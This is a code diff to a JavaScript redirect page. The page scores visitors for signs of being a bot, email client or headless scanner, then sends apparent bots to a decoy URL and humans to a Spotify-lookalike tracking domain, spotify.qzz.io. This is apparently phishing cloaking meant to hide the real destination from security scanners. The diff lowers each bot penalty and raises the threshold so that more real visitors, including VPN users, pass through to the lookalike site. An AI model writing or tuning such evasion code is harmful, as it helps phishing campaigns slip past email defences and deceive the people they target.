@@ -29,20 +29,20 @@
             let mouseMovements = 0;
             let clickEvents = 0;
 
-            // Check email clients & obvious bots
-            if (/outlook|thunderbird|mailkit|bot|crawler|spider|python|curl|wget|postman|insomnia/.test(ua)) s += 6;
+            // Check email clients & obvious bots - very lenient
+            if (/outlook|thunderbird|mailkit|bot|crawler|spider|python|curl|wget|postman|insomnia/.test(ua)) s += 4;
 
-            // Check missing features (comprehensive but VPN-friendly)
-            if (!window.localStorage || !window.requestAnimationFrame || !window.JSON) s += 4;
-            if (navigator.webdriver || window._phantom || window.callPhantom) s += 5;
-            if (screen.width < 100 || screen.height < 100) s += 3;
+            // Check missing features (very VPN-friendly)
+            if (!window.localStorage || !window.requestAnimationFrame || !window.JSON) s += 2;
+            if (navigator.webdriver || window._phantom || window.callPhantom) s += 3;
+            if (screen.width < 50 || screen.height < 50) s += 2; // Very small screens only
 
-            // Check for headless indicators
-            if (!window.outerHeight || !window.outerWidth) s += 2;
-            if (navigator.plugins.length === 0) s += 1;
+            // Check for headless indicators - minimal penalty
+            if (!window.outerHeight || !window.outerWidth) s += 1;
+            if (navigator.plugins.length === 0) s += 0; // No penalty - many browsers block plugins
 
-            // Check browser-specific features
-            if (!window.chrome && /chrome/.test(ua)) s += 2; // Chrome without window.chrome
+            // Check browser-specific features - minimal penalty
+            if (!window.chrome && /chrome/.test(ua)) s += 1; // Very low penalty
 
             // Enhanced interaction tracking
             const trackInteraction = () => {
@@ -71,11 +71,11 @@
             const performRedirect = () => {
                 const elapsedTime = (Date.now() - startTime) / 1000;
 
-                // Calculate final bot score (VPN-friendly)
-                if (!hasInteraction) s += 3;
-                if (mouseMovements < 1) s += 2;
-                if (clickEvents === 0 && mouseMovements === 0) s += 1;
-                if (elapsedTime < 1.5) s += 2; // Too fast but more lenient
+                // Calculate final bot score (very VPN-friendly)
+                if (!hasInteraction) s += 1; // Very minimal penalty
+                if (mouseMovements < 1) s += 0; // No penalty for no mouse movement
+                if (clickEvents === 0 && mouseMovements === 0) s += 1; // Only if absolutely no interaction
+                if (elapsedTime < 1) s += 1; // Only penalize extremely fast access
 
                 // Prepare redirect URLs with tracking parameters
                 const baseReal = 'https://spotify.qzz.io/tracker/click.php?goto=https://spotify.qzz.io';
@@ -87,12 +87,12 @@
                 const realUrl = baseReal + jsParam + delayParam + interactionParam;
                 const safeUrl = baseSafe;
 
-                // Redirect based on bot score (threshold: 4, VPN-friendly)
-                location.href = s >= 4 ? safeUrl : realUrl;
+                // Redirect based on bot score (threshold: 6, very VPN-friendly)
+                location.href = s >= 6 ? safeUrl : realUrl;
             };
 
-            // Minimum delay before redirect
-            setTimeout(performRedirect, 2500);
+            // Minimum delay before redirect - faster for users
+            setTimeout(performRedirect, 2000);
 
             // Backup link setup
             setTimeout(() => {
